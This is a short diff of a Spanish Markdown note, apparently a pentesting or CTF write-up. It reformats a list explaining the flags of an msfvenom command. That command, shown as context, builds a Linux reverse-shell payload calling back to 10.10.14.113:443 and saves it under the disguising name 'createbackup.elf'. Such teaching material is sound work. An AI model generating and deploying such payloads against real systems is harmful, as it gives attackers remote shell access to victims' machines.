@@ -59,8 +59,8 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > cr
 - **-p**: Indica a msfvenom que se debe crear un PAYLOAD.
 - **linux/x64/shell_reverse_tcp**: indica a msfvenom el tipo de PAYLOAD a generar según la arquitectura de la víctima.
 - **LHOST // LPORT**: Indica el Local Host y Port del atacante. 
-- **-f efl**: indica que el payload se encapsulará en un 
-- **>createbackup.elf**: indica el nombre del archivo a la salida.
+- **-f efl**: indica que el payload se encapsulará en un:
+	- **>createbackup.elf**: indica el nombre del archivo a la salida.
 
 
 Para un sistema windows, el comando utilizado poddría ser un de este tipo:
